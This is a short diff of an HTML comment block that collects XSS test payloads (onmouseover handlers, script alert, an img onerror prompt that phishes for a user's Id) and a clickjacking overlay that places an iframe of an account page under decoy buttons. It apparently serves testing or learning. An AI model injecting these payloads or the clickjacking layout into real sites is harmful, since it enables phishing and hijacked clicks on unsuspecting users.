@@ -47,8 +47,13 @@ Fucntionning :
     <a onmouseover="alert('youhou')"\>Click me!</a>
     <a onmouseover="document.body.style='color:blue;'"\>Click me!</a>
     <a onmouseover="document.body.style='transform:rotate(180deg);'"\>Click me!</a>
-    
-    Trying some Clickjacking :
+
+ Not Fucntionning:
+    <script>alert('youhou')</script>
+    <img src/onerror=prompt('Sorry, an error was occur. Please, enter your Id to continue')>
+    <component is=script text=alert(1)>
+
+Trying some Clickjacking (No XSS):
     <style>
         iframe {
         position:relative;
@@ -88,12 +93,6 @@ Fucntionning :
         <div class="firstClick">Click me first</div>
         <div class="secondClick">Click me next</div>
         <iframe src="https://vulnerable.net/account"></iframe>
-
-
- Not Fucntionning:
-    <script>alert('youhou')</script>
-    <img src/onerror=prompt('Sorry, an error was occur. Please, enter your Id to continue')>
-    <component is=script text=alert(1)>
 
  -->
 
